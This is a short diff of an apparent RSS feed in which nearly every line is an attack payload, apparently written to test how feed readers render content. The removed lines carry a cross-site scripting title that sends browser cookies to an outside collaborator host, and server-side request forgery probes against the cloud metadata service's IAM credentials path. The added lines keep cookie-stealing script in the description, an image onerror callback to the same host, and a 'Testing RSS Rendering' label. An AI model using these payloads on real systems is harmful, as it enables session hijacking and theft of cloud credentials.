@@ -1,11 +1,10 @@
-<title>&lt;script&gt;fetch('http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/xss?c='+document.cookie)&lt;/script&gt;</title>
-<item>
-    <title>Urgent Security Update</title>
-    <link>http://169.254.169.254/latest/meta-data/iam/security-credentials/</link>
-    <description>
-        <![CDATA[
-        <img src="http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/blind_ssrf_img">
-        Check this: <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
-        ]]>
-    </description>
-</item>
+<title>&lt;script&gt;fetch('http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/xss_title')&lt;/script&gt;</title>
+<description>
+  <![CDATA[
+    <script>
+      fetch('http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/xss_desc?c=' + document.cookie);
+    </script>
+    <img src="x" onerror="fetch('http://w74dq2hcxq04vscpxncgkp8sajga49sy.oastify.com/img_onerror')">
+    <b>Testing RSS Rendering</b>
+  ]]>
+</description>
